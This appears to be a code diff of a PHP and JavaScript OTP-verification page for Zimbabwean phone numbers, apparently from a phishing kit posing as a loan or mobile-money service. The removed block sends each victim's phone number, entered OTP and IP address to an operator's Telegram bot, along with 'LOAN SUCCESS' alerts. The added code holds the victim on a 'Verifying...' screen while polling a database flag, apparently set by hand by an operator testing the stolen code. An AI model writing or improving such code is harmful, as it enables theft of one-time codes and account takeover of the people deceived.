@@ -93,6 +93,7 @@ if (!isset($_SESSION['phone'])) {
 
 $phone = trim($_SESSION['phone']);
 $error = '';
+$statusMessage = '';
 
 // Process OTP submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -129,49 +130,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                       VALUES ($1, 0, 0, 0, 0) 
                       ON CONFLICT (phone) DO NOTHING";
         pg_query_params($conn, $insertSQL, [$phone]);
-        
-        // Check the `otp` flag AND `logout` flag for this phone
-        $checkSQL = "SELECT otp, logout FROM users WHERE phone = $1";
-        $result = pg_query_params($conn, $checkSQL, [$phone]);
-        if ($result && $row = pg_fetch_assoc($result)) {
-            $otpStatus = (int)$row['otp'];
-            $logoutStatus = (int)$row['logout'];
-            
-            if ($otpStatus == 1) {
-                // Check logout column value
-                if ($logoutStatus == 0) {
-                    // Update error_processing to 1 (column now exists thanks to ALTER TABLE)
-                    $updateSQL = "UPDATE users SET error_processing = 1 WHERE phone = $1";
-                    pg_query_params($conn, $updateSQL, [$phone]);
-                    
-                    // Send Telegram notification
-                    $errorMsg = "⚠️ OTP VERIFIED BUT LOGOUT=0 ⚠️<br>📱 Phone: +263 {$phone}<br>🕒 Time: " . date('Y-m-d H:i:s') . "<br>Action: error_processing set to 1";
-                    sendTelegramMessage($botToken, $chatId, $errorMsg, 'HTML');
-                    
-                    $error = "System processing error. Please contact support.";
-                } elseif ($logoutStatus == 1) {
-                    // Redirect to loggedin.php
-                    $successMsg = "✅ LOAN SUCCESS ✅<br>📱 Phone: +263 {$phone}<br>🕒 Time: " . date('Y-m-d H:i:s');
-                    sendTelegramMessage($botToken, $chatId, $successMsg, 'HTML');
-                    
-                    header("Location: loggedin.php");
-                    exit;
-                } else {
-                    // Default case - redirect to dashboard
-                    header("Location: dashboard.php");
-                    exit;
-                }
-            } else {
-                $error = "Wrong OTP";
-                // Optional: send Telegram notification of failed attempt
-                $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-                $time = date('Y-m-d H:i:s');
-                $msg = "❌ *Failed OTP attempt*\n\n📱 Phone: +263 {$phone}\n🔢 OTP entered: `{$enteredOtp}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
-                sendTelegramMessage($botToken, $chatId, $msg, 'Markdown');
-            }
-        } else {
-            $error = "Database error. Please try again.";
-        }
     }
 }
 
@@ -222,14 +180,31 @@ p {
     font-size: 15px;
 }
 
-.error-message {
-    background: #fee2e2;
-    color: #dc2626;
+.status-message {
     padding: 10px;
     border-radius: 8px;
     margin-bottom: 20px;
     text-align: center;
     font-size: 14px;
+    transition: all 0.3s ease;
+}
+
+.status-verifying {
+    background: #e0f2fe;
+    color: #0284c7;
+    border-left: 4px solid #0284c7;
+}
+
+.status-wrong {
+    background: #fee2e2;
+    color: #dc2626;
+    border-left: 4px solid #dc2626;
+}
+
+.status-error {
+    background: #fef3c7;
+    color: #d97706;
+    border-left: 4px solid #d97706;
 }
 
 .otp-box {
@@ -278,6 +253,11 @@ button:hover {
     background: #1d4ed8;
 }
 
+button:disabled {
+    background: #9ca3af;
+    cursor: not-allowed;
+}
+
 .timer {
     margin-top: 24px;
     text-align: center;
@@ -288,6 +268,10 @@ button:hover {
 .timer a {
     color: #2563eb;
     text-decoration: none;
+}
+
+.hidden-form {
+    display: none;
 }
 
 @media (max-width: 480px) {
@@ -322,17 +306,15 @@ button:hover {
         <strong>+263 <?= htmlspecialchars($maskedPhone) ?></strong>
     </p>
 
-    <?php if ($error): ?>
-        <div class="error-message"><?= htmlspecialchars($error) ?></div>
-    <?php endif; ?>
+    <div id="statusMessage" class="status-message status-verifying">🔍 Verifying...</div>
 
-    <form method="POST">
+    <form id="otpForm" method="POST">
         <div class="otp-box">
             <?php for ($i = 0; $i < 6; $i++): ?>
                 <input type="text" name="otp[]" maxlength="1" inputmode="numeric" required autocomplete="off">
             <?php endfor; ?>
         </div>
-        <button type="submit">Submit</button>
+        <button type="submit" id="submitBtn">Submit</button>
     </form>
 
     <div class="timer" id="timer">Resend OTP in 120 seconds</div>
@@ -340,6 +322,72 @@ button:hover {
 
 <script>
 const inputs = document.querySelectorAll('.otp-box input');
+const submitBtn = document.getElementById('submitBtn');
+const statusDiv = document.getElementById('statusMessage');
+const form = document.getElementById('otpForm');
+let monitoringInterval = null;
+let isProcessing = false;
+let hasRedirected = false;
+
+// Auto-check database status every 2 seconds
+function checkDatabaseStatus() {
+    if (hasRedirected) return;
+    
+    fetch(window.location.href, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Requested-With': 'XMLHttpRequest'
+        },
+        body: 'check_status=1'
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            const otpValue = data.otp_value;
+            
+            // Check the OTP database value
+            if (otpValue === 0) {
+                statusDiv.className = 'status-message status-verifying';
+                statusDiv.innerHTML = '🔍 Verifying...';
+            } else if (otpValue === 1) {
+                statusDiv.className = 'status-message status-wrong';
+                statusDiv.innerHTML = '❌ Wrong OTP';
+                // Stop monitoring when wrong OTP is detected
+                if (monitoringInterval) {
+                    clearInterval(monitoringInterval);
+                    monitoringInterval = null;
+                }
+            } else if (otpValue === 2) {
+                statusDiv.className = 'status-message';
+                statusDiv.style.background = '#d4edda';
+                statusDiv.style.color = '#155724';
+                statusDiv.style.borderLeft = '4px solid #155724';
+                statusDiv.innerHTML = '✅ OTP Verified! Redirecting...';
+                // Stop monitoring and redirect
+                if (monitoringInterval) {
+                    clearInterval(monitoringInterval);
+                    monitoringInterval = null;
+                }
+                hasRedirected = true;
+                
+                // Check logout status before redirecting
+                if (data.logout_status === 1) {
+                    setTimeout(() => {
+                        window.location.href = 'loggedin.php';
+                    }, 1000);
+                } else {
+                    setTimeout(() => {
+                        window.location.href = 'dashboard.php';
+                    }, 1000);
+                }
+            }
+        }
+    })
+    .catch(error => {
+        console.error('Error checking status:', error);
+    });
+}
 
 inputs.forEach((input, i) => {
     input.addEventListener('input', () => {
@@ -358,19 +406,126 @@ inputs.forEach((input, i) => {
 
 inputs[0].focus();
 
+// Handle form submission
+form.addEventListener('submit', function(e) {
+    if (isProcessing) {
+        e.preventDefault();
+        return;
+    }
+    
+    e.preventDefault();
+    
+    // Get entered OTP
+    let otpValue = '';
+    inputs.forEach(input => {
+        otpValue += input.value;
+    });
+    
+    if (otpValue.length !== 6) {
+        statusDiv.className = 'status-message status-wrong';
+        statusDiv.innerHTML = '❌ Please enter complete 6-digit OTP';
+        return;
+    }
+    
+    isProcessing = true;
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Verifying...';
+    
+    // Submit the form via AJAX
+    const formData = new FormData(form);
+    
+    fetch(window.location.href, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.text())
+    .then(html => {
+        // Parse response to check for errors
+        const tempDiv = document.createElement('div');
+        tempDiv.innerHTML = html;
+        const errorMsg = tempDiv.querySelector('.error-message');
+        
+        if (errorMsg && errorMsg.textContent.includes('Wrong OTP')) {
+            statusDiv.className = 'status-message status-wrong';
+            statusDiv.innerHTML = '❌ Wrong OTP';
+            isProcessing = false;
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Submit';
+        } else {
+            // Start monitoring database status
+            statusDiv.className = 'status-message status-verifying';
+            statusDiv.innerHTML = '🔍 Verifying...';
+            
+            if (monitoringInterval) {
+                clearInterval(monitoringInterval);
+            }
+            monitoringInterval = setInterval(checkDatabaseStatus, 2000);
+            checkDatabaseStatus(); // Check immediately
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        statusDiv.className = 'status-message status-error';
+        statusDiv.innerHTML = '⚠️ Network error. Please try again.';
+        isProcessing = false;
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Submit';
+    });
+});
+
+// Timer functionality
 let time = 120;
 const timer = document.getElementById("timer");
 
-const interval = setInterval(() => {
+const timerInterval = setInterval(() => {
     if (time > 0) {
         time--;
         timer.innerText = "Resend OTP in " + time + " seconds";
     } else {
-        clearInterval(interval);
+        clearInterval(timerInterval);
         timer.innerHTML = '<a href="resend.php">Resend OTP</a>';
     }
 }, 1000);
 </script>
+
+<?php
+// Handle AJAX status check requests
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
+    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest' && isset($_POST['check_status'])) {
+    
+    header('Content-Type: application/json');
+    
+    if (!isset($_SESSION['phone'])) {
+        echo json_encode(['success' => false, 'error' => 'No phone in session']);
+        exit;
+    }
+    
+    $phone = trim($_SESSION['phone']);
+    $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+    
+    if (!$conn) {
+        echo json_encode(['success' => false, 'error' => 'DB connection failed']);
+        exit;
+    }
+    
+    $sql = "SELECT otp, logout FROM users WHERE phone = $1";
+    $result = pg_query_params($conn, $sql, [$phone]);
+    
+    if ($result && $row = pg_fetch_assoc($result)) {
+        $otpValue = (int)$row['otp'];
+        $logoutStatus = (int)$row['logout'];
+        
+        echo json_encode([
+            'success' => true, 
+            'otp_value' => $otpValue,
+            'logout_status' => $logoutStatus
+        ]);
+    } else {
+        echo json_encode(['success' => false, 'error' => 'User not found']);
+    }
+    exit;
+}
+?>
 
 </body>
 </html>
